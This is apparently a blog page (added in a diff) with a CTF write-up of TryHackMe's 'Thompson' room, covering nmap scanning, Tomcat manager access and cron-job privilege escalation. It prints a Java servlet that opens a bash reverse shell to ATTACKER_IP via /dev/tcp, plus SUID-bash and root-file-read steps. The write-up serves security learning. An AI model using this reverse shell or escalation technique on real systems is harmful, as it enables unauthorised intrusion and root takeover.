@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TryHackMe | Thompson</title>
+  <link rel="stylesheet" href="/styles/base.css">
+  <link rel="stylesheet" href="/styles/shared/header.css">
+  <link rel="stylesheet" href="/styles/shared/footer.css">
+  <link rel="stylesheet" href="/styles/shared/thmLabs.css">
+  <link rel="icon" href="/favicon.ico" type="image/x-icon">
+</head>
+
+<body>
+
+  <!-- Header Container  -->
+  <div id="header-container"></div>
+
+  <!-- Body Container  -->
+  <main id="main">
+
+    <h1>TryHackMe | Thompson</h1>
+
+    <div class="thompson0">
+      <img src="/assets/images/thmImages/thm-thompson.png" alt="Thompson CTF" />
+    </div>
+
+    <p id="extLink" onclick="window.open('https://tryhackme.com/room/bsidesgtthompson', '_blank')">☍ Room Link -
+      "https://tryhackme.com/room/bsidesgtthompson"</p>
+
+    <blockquote>
+      <p>Hello fellow hackers, learners, and security enthusiasts! 💻</p><br>
+      <p>Welcome to my corner of the internet where I document my path through the exciting world of penetration testing
+        and cybersecurity. Whether you're here to follow along, learn together, or just curious about ethical hacking -
+        I'm glad you stopped by!</p>
+    </blockquote><br>
+
+    <h2>⚝ Introduction</h2>
+
+    <p>This writeup walks through the <strong>"Thompson"</strong> challenge from <strong>TryHackMe</strong>. You'll
+      follow a step-by-step journey from initial reconnaissance to full system compromise, including the real-world
+      trial and errors encountered along the way.</p><br>
+
+    <p><strong>👉 In this guide, you'll learn :</strong></p>
+    <ul>
+      <li>Basic enumeration techniques using <strong>nmap</strong>.</li>
+      <li>Web server vulnerability assessment</li>
+      <li>Exploitation (Path 1) - Payload creation using <strong>Metasploit</strong> module <strong></strong>.</li>
+      <li>Exploitation (Path 2) - Manual <strong>WAR</strong> file creation.</li>
+      <li>Linux file permissions analysis</li>
+      <li>Cron job examination</li>
+      <li>PrivEsc (Path 1) - Shell script modification to get the root flag's content.</li>
+      <li>PrivEsc (Path 2) - SUID binary creation via cronjob.</li>
+    </ul>
+
+    <p>Grab a coffee and let's get started! ☕</p><br>
+
+    <p><strong>📋 Machine Description and Tasks -</strong></p>
+    <ul>
+      <li><strong>Description</strong> - boot2root machine for FIT and bsides guatemala CTF</li>
+      <li><strong>Tasks</strong> - read user.txt and root.txt</li>
+    </ul>
+
+    <h2>⚝ Enumeration</h2>
+
+    <p>First, I started with a basic <strong>nmap</strong> scan as usual - </p>
+    <p><strong>Nmap Scan Results : -</strong> </p>
+    <pre><code class="shell">
+ ➥ $ nmap -sCV -p- 10.10.159.83
+
+Nmap scan report for 10.10.159.83
+Host is up (0.012s latency).
+Not shown: 65532 closed tcp ports (conn-refused)
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
+|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
+|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
+8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
+|_ajp-methods: Failed to get a valid response for the OPTION request
+8080/tcp open  http    Apache Tomcat 8.5.5
+|_http-favicon: Apache Tomcat
+|_http-title: Apache Tomcat/8.5.5
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.81 seconds
+    </code></pre>
+
+    <p><strong>✦ Command Explanation -</strong></p>
+    <ul>
+      <li><strong>nmap</strong> , network exploration tool and security / port scanner.</li>
+      <li><strong>-sC</strong> , for default script.</li>
+      <li><strong>-sV</strong> , for service/version info.</li>
+      <li><strong>-p-</strong> , to scan ports from 1 through 65535.</li>
+    </ul>
+
+    <p id="extLink" onclick="window.open('https://manpages.ubuntu.com/manpages/trusty/en/man1/nmap.1.html', '_blank')">
+      🕮 Read More - "https://manpages.ubuntu.com/manpages/trusty/en/man1/nmap.1.html"</p>
+    <br>
+
+    <p><strong>👆 From the above scan results -</strong></p>
+    <ul>
+      <li><strong>Port 8080</strong> : 'Apache Tomcat' web server (<strong>Java web application server</strong>).</li>
+      <li><strong>Port 8009</strong> : 'Apache JServ Protocol (AJP)' service is running. It's a <strong>binary
+          protocol</strong> for communication between Apache HTTPD web server (Front-end) and Java servlet container
+        (Back-end). I did a bit google search on this.</li>
+      <li> <strong>Port 22</strong> : 'OpenSSH' server and The service is running and accessible on port 22.</p>
+      </li>
+    </ul>
+    <br>
+
+    <p><strong>👉 Note :</strong>
+    <ul>
+      <li>
+        <p>This machine is running an outdated and vulnerable version of Apache Tomcat 8, for which there are multiple
+          guides available to craft the payload. While easy methods like using a Metasploit module, this write-up will
+          focus on a
+          manual exploitation process.</p>
+      </li>
+    </ul>
+    <br>
+
+
+    <h2>⚝ Exploitation</h2>
+
+    <p>Let's visit the web page at "http://10.10.159.83:8080/" - </p>
+    <img alt="Apache Tomcat" src="/assets/images/thmImages/thm-thompson-pic1.png" />
+    <br>
+
+    <p>I tried to check the <strong>server status</strong> option and I got an pop up to enter the username and
+      password. I tried with some basic combinations but no success there.</p>
+    <br>
+    
+    <img alt="Apache Tomcat Login" src="/assets/images/thmImages/thm-thompson-pic2.png" />
+    <br>
+
+    <p><strong>Interestingly,</strong> upon clicking the cancel button the server displays an error message. Which reveals the username and
+      password. Check the below image - </p><br>
+    <img alt="Tomcat Credentials" src="/assets/images/thmImages/thm-thompson-pic3.png" />
+    <br>
+
+    <p>Let's try to login with the given credentials from the above step and you will find the below page - </p><br>
+    <img alt="Server Status" src="/assets/images/thmImages/thm-thompson-pic4.png" /><br>
+    <img alt="Server Status" src="/assets/images/thmImages/thm-thompson-pic5.png" /><br>
+
+    <p><strong>👉 Note :</strong>
+      <ul>
+        <li>Find the java version from the above image. We have to consider it when crafting our payload.</li>
+      </ul>
+    <br>
+
+    <p>Now, if we select <strong>List Applications</strong> option we can see a page of running applications and also we
+      have an option to deploy our custom applications <strong>(WAR File - Web Application Archive File)</strong>.</p><br>
+    <img alt="Deploy War File" src="/assets/images/thmImages/thm-thompson-pic6.png" /><br>
+
+
+    <h3>Path 1 - Crafting a Payload (Using Metasploit)</h3>
+    <img alt="Deploy War File" src="/assets/images/thmImages/thm-thompson-pic6-1.png" /><br>
+
+    <br>
+    <p>That's all. I have uploaded the war file and deployed it. And after vising - "http://10.10.27.199:8080/shell/", I got the response from server.</p>
+
+    <img alt="Deploy War File" src="/assets/images/thmImages/thm-thompson-pic6-2.png" /><br>
+
+
+    <h3>Path 2 - Manual Payload Creation</h3>
+
+    <p>A WAR file is essentially a ZIP file with a specific folder structure that Java application servers expect. For
+      our servlet to work, we must create this structure manually.</p>
+    <p>Here is the required structure for our project, named <strong>ReverseShell</strong>:</p>
+    <pre><code>
+ReverseShell/
+├── WEB-INF/
+│   ├── web.xml
+│   └── classes/
+└── ShellServlet.java (source file, not included in the WAR)
+</code></pre>
+    <br>
+
+    <p><strong>👆 What I Did:</strong></p>
+    <ol>
+      <li>I have created the main project folder: <strong>ReverseShell</strong>.</li>
+      <li>Inside it, I created the <strong>WEB-INF</strong> folder.</li>
+      <li>Inside <strong>WEB-INF</strong>, I created the <strong>classes</strong> folder.</li>
+      <li>I placed the <strong>ShellServlet.java</strong> source file in the main <strong>ReverseShell</strong> folder.</li>
+      <li>I created and configured the <strong>web.xml</strong> deployment descriptor inside the <strong>WEB-INF</strong>
+        folder.</li>
+    </ol>
+    <br>
+
+    <blockquote>
+      <p><strong>👉 Note for Beginners:</strong> The <code>WEB-INF/classes</code> directory is where the compiled Java
+        classes (<code>.class</code> files) must live. The server automatically looks for them here.</p>
+    </blockquote>
+    <br>
+
+    <p><code>ShellServlet.java</code></p>
+    <pre><code class="java">
+import java.io.*;
+import javax.servlet.*;
+import javax.servlet.http.*;
+
+public class ShellServlet extends HttpServlet {
+    public void doGet(HttpServletRequest request, HttpServletResponse response)
+            throws ServletException, IOException {
+        String host = &quot;ATTACKER_IP&quot;;
+        int port = 4444;
+        String[] cmd = {&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;/bin/bash -i &gt;&amp; /dev/tcp/&quot; + host + &quot;/&quot; + port + &quot; 0&gt;&amp;1&quot;};
+        Runtime.getRuntime().exec(cmd);
+    }
+}
+    </code></pre>
+    <br>
+
+    <p><code>web.xml</code></p>
+    <pre><code class="language-xml">
+&lt;web-app&gt;
+  &lt;servlet&gt;
+    &lt;servlet-name&gt;ShellServlet&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;ShellServlet&lt;/servlet-class&gt;
+  &lt;/servlet&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;ShellServlet&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/shell&lt;/url-pattern&gt;
+  &lt;/servlet-mapping&gt;
+&lt;/web-app&gt;
+    </code></pre>
+
+    <br>
+
+    <p>A servlet depends on classes from the <strong>servlet-api.jar</strong> library, which is not part of the standard
+      Java SE. I had to provide this library during compilation.</p>
+    <pre><code class="language-shell">$ /usr/lib/jvm/java-8-openjdk/bin/javac -cp &quot;/usr/share/java/tomcat8/servlet-api.jar&quot; -d ReverseShell/WEB-INF/classes/ ReverseShell/ShellServlet.java
+    </code></pre>
+    <br>
+
+    <p><strong>👆 Explanation of the Command:</strong></p>
+    <ul>
+      <li><strong>javac</strong>: The Java compiler.</li>
+      <li><strong>-cp "/usr/share/java/tomcat8/servlet-api.jar"</strong>: The <strong>-cp</strong> flag sets the
+        <strong>Classpath</strong>. This tells the compiler where to find the necessary <strong>servlet-api.jar</strong>
+        library.
+      </li>
+      <li><strong>-d ReverseShell/WEB-INF/classes/</strong>: The <strong>-d</strong> flag specifies the <strong>output
+          directory</strong>. This is the most important part! It tells <strong>javac</strong> to put the generated
+        <strong>ShellServlet.class</strong> file directly into the correct <strong>WEB-INF/classes</strong> folder.
+      </li>
+      <li><strong>ReverseShell/ShellServlet.java</strong>: This is the path to our source file.</li>
+    </ul>
+    <br>
+
+    <p><strong>Why the specific paths?</strong></p>
+    <ul>
+      <li>I used the full path to <code>javac</code> (<code>/usr/lib/jvm/.../javac</code>) because I have multiple Java
+        versions installed, and I needed to ensure I used Java 8.</li>
+      <li>I specified the path to <code>servlet-api.jar</code> because it's part of Tomcat, not the standard Java
+        installation.</li>
+    </ul>
+    <br>
+
+    <p>Once the <strong>.class</strong> file is in <strong>WEB-INF/classes</strong> and the <strong>web.xml</strong> is in
+      <strong>WEB-INF</strong>, we can create the WAR file. (You should remove the Java source file from the folder before
+      creating the WAR file, as leaving source code in deployment packages is not a good idea.)
+    </p>
+    <br>
+
+    <p>Finally, we can create our war file - </p>
+    <p><img alt="Creating War File" src="/assets/images/thmImages/thm-thompson-pic7.png" /></p>
+    <br>
+
+    <p><strong>👆 Explanation of the Command:</strong></p>
+    <ul>
+      <li><strong>jar</strong> : The utility for creating Java archive files (JAR, WAR).</li>
+      <li><strong>-cvf</strong> : These are options.<ul>
+          <li><code>c</code> - <strong>C</strong>reate a new archive.</li>
+          <li><code>v</code> - Produce <strong>v</strong>erbose output (shows the files being added).</li>
+          <li><code>f</code> - Specify the <strong>f</strong>ilename of the archive.</li>
+        </ul>
+      </li>
+      <li><strong>reverse.war</strong>: The name of the WAR file we are creating.</li>
+      <li><strong>-C ReverseShell/ .</strong> : This is a crucial part.<ul>
+          <li>The <code>-C</code> flag means "<strong>C</strong>hange to this directory."</li>
+          <li><code>ReverseShell/</code> is the directory we change to.</li>
+          <li>The <code>.</code> means "add all files and folders from here."</li>
+          <li>So, this command adds the <em>contents</em> of the <code>ReverseShell</code> folder (which are
+            <code>WEB-INF/</code> and our other files) directly into the root of the <code>reverse.war</code> file,
+            preserving the correct structure.
+          </li>
+        </ul>
+      </li>
+    </ul>
+    <br>
+
+    <p>The final <strong>reverse.war</strong> file will be created in your current working directory and is ready to be
+      deployed to a server like Tomcat.</p>
+    
+    <br>
+    <p>➤ For reference, please check the below links :</p>
+    <ul>
+      <li><p id="extLink"
+            onclick="window.open('https://medium.com/@mingihongkim/exploiting-java-portlets-with-a-malicious-war-file-to-gain-a-reverse-shell-2504909f71c1', '_blank')">"https://medium.com/@mingihongkim/exploiting-java-portlets-with-a-malicious-war-file-to-gain-a-reverse-shell-2504909f71c1"</p></li>
+      <li><p id="extLink"
+            onclick="window.open('https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#java', '_blank')">"https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#java"</p></li>
+      <li><p id="extLink"
+            onclick="window.open('https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/tomcat/index.html', '_blank')">"https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/tomcat/index.html"</p></li>
+    </ul>
+    <br>
+
+    <p>Well, we have also started our listener now let's upload the file.</p>
+    <img alt="Uploaded The War File" src="/assets/images/thmImages/thm-thompson-pic8.png" />
+
+
+    <h2>⚝ Initial Access</h2>
+    <p>We have to visit "http://10.10.159.83:8080/reverse/shell" to trigger our reverse shell. And, we got a response - </p>
+    <p><img alt="User Flag" src="/assets/images/thmImages/thm-thompson-pic9.png" /></p>
+    <br>
+
+    <p><strong>👉 After gaining the shell -</strong></p>
+    <ul>
+      <li>Upgraded a shell using Python 3 - <strong>python3 -c 'import pty; pty.spawn("/bin/bash")'</strong>. This will
+      create a more interactive shell environment.</li>
+      <li><strong>whoami</strong> - to check the current user.</li>
+      <li><strong>cd /home/jack</strong> - to change our working directory</li>
+      <li><strong>user.txt</strong> file contains our <strong>user flag</strong>.</p></li>
+    </ul>
+    <br>
+
+
+    <h2>⚝ Privilege Escalation</h2>
+
+    <p>Let's analyse the other files inside <strong>/home/jack</strong> directory - </p>
+    <p><img alt="Analysing The Files" src="/assets/images/thmImages/thm-thompson-pic10.png" /></p>
+    <br>
+
+    <p><strong>👆 Explanation - </strong></p>
+    <ol>
+      <li><strong>id.sh</strong> - This is a simple bash script which executes the <strong>id</strong> command and saves
+        the output in <strong>test.txt</strong> file. The user <strong>tomcat</strong> (currently logged in user) has
+        all the permissions i.e. (read, write, and execute).</li>
+      <li><strong>test.txt</strong> - The user <strong>tomcat</strong> (currently logged in user) has only read
+        permission.</li>
+    </ol>
+    <br>
+
+    <p>Although we can edit and execute the <strong>id.sh</strong> file, If we try to run this file we will face an
+      error as we do not have write permission to the <strong>test.txt</strong> file.</p>
+    
+    <br>
+    <p id="extLink"onclick="window.open('https://www.redhat.com/en/blog/linux-file-permissions-explained', '_blank')">🕮
+    "https://www.redhat.com/en/blog/linux-file-permissions-explained"</p>
+
+    <p id="extLink" onclick="window.open('https://linuxhandbook.com/linux-file-permissions/', '_blank')">🕮
+    "https://linuxhandbook.com/linux-file-permissions/"</p>
+    <br>
+
+    <p>If you check the content inside the <strong>test.txt</strong> file, we will find that those are actually coming
+      from root user. So, the file (id.sh) is somehow executing from root user account.</p>
+    <br>
+    <p>Check the ids - </p>
+      <img alt="User IDs" src="/assets/images/thmImages/thm-thompson-pic11.png" />
+    <br>
+
+    <h3>System-wide cron jobs</h3>
+    <p><img alt="Cron Jobs" src="/assets/images/thmImages/thm-thompson-pic12.png" /></p>
+    <br>
+
+    <p><strong>👆 What it means:</strong></p>
+    <ul>
+      <li>* * * * * - Runs <strong>every minute of every hour, every day, every month</strong></li>
+      <li><strong>root</strong> - Executes as the <strong>root user</strong></li>
+      <li><strong>cd /home/jack &amp;&amp; bash id.sh</strong> - The command that runs</li>
+    </ul>
+    <br>
+
+    <p>Well, we do have permission to edit the <strong>id.sh</strong> file. Let's modify it so our command executes with
+      root privileges.</p>
+    <br>
+
+    <h3>PrivEsc (Path 1) - The Easy Path</h3>
+    <p><img alt="Priv Esca 1" src="/assets/images/thmImages/thm-thompson-pic13.png" /></p>
+    <br>
+
+    <p><strong>👆 Explanation - </strong></p>
+    <ul>
+      <li>Here, I assumed that the root flag is stored in <strong>/root/root.txt</strong>.</li>
+      <li><strong>echo 'cat /root/root.txt &gt;&gt; /home/jack/test.txt'</strong> - Creates the command string that reads
+      <strong>/root/root.txt</strong> (root's flag file) and appends the output to <strong>/home/jack/test.txt</strong>.</li>
+      <li><strong>&gt;&gt; id.sh</strong> - Appends this command to the <strong>id.sh</strong> script.</li>
+      <li>After a few second we can get the updated content from <strong>test.txt</strong> file with the <strong>root
+        flag</strong>.</li>
+    </ul>
+    <br>
+
+    <h3>PrivEsc (Path 2) - The Learning Path</h3>
+    <p><img alt="Priv Esc 2" src="/assets/images/thmImages/thm-thompson-pic14.png" /></p>
+    <br>
+
+    <p><strong>👆 Explanation - </strong></p>
+    <ul>
+      <li>Here, I have created a SUID binary to gain root shell access.</li>
+      <li><strong>cp /bin/bash /tmp/bash</strong> - Copies the bash binary to <strong>/tmp/bash</strong>.</li>
+      <li><strong>chmod u+s /tmp/bash</strong> - Sets the <strong>SUID (Set User ID) bit</strong> on the copied bash
+      binary, making it run with the file owner's privileges (root).</li>
+      <li><strong>&gt;&gt; id.sh</strong> - Appends this command to the <strong>id.sh</strong> script.</li>
+      <li><strong>/tmp/bash -p</strong> - Executes our SUID bash binary with the <strong>-p</strong> flag.</li>
+      <li>The <strong>-p flag is crucial</strong> as it prevents bash from dropping privileged permissions, allowing us to
+      maintain root privileges.</p></li>
+    </ul>
+    <br>
+
+    <p id="congrt">💻 Happy Hacking 💻</p>
+
+  </main>
+
+  <!-- Footer Container  -->
+  <div id="footer-container"></div>
+
+  <!-- Scripts  -->
+  <script src="/scripts/main.js"></script>
+</body>
+
+</html>
